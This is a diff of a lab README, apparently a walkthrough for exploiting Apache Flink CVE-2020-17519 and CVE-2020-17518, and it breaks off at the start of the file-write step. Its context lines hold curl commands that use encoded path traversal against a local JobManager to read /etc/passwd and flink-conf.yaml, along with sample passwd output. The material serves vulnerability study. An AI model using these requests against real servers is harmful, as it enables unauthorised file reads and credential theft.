@@ -19,6 +19,7 @@ Versions 1.11.0, 1.11.1, and 1.11.2 of Apache Flink contain two severe directory
 ## Exploitation Walkthrough
 
 ### 1. Arbitrary File Read (CVE-2020-17519)
+
 Query the JobManager custom log endpoint using double URL-encoded path traversal sequences (`%252f` for `/`):
 
 ```bash
@@ -26,6 +27,7 @@ curl 'http://localhost:8135/jobmanager/logs/..%252f..%252f..%252f..%252f..%252fe
 ```
 
 Output:
+
 ```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -35,11 +37,13 @@ flink:x:9999:9999::/opt/flink:/bin/sh
 ```
 
 Inspect sensitive runtime configurations or credentials:
+
 ```bash
 curl 'http://localhost:8135/jobmanager/logs/..%252f..%252f..%252f..%252fopt%252fflink%252fconf%252fflink-conf.yaml'
 ```
 
 ### 2. Arbitrary File Write (CVE-2020-17518)
+
 Upload a file with directory traversal in the filename field to the `/jars/upload` endpoint:
 
 ```bash
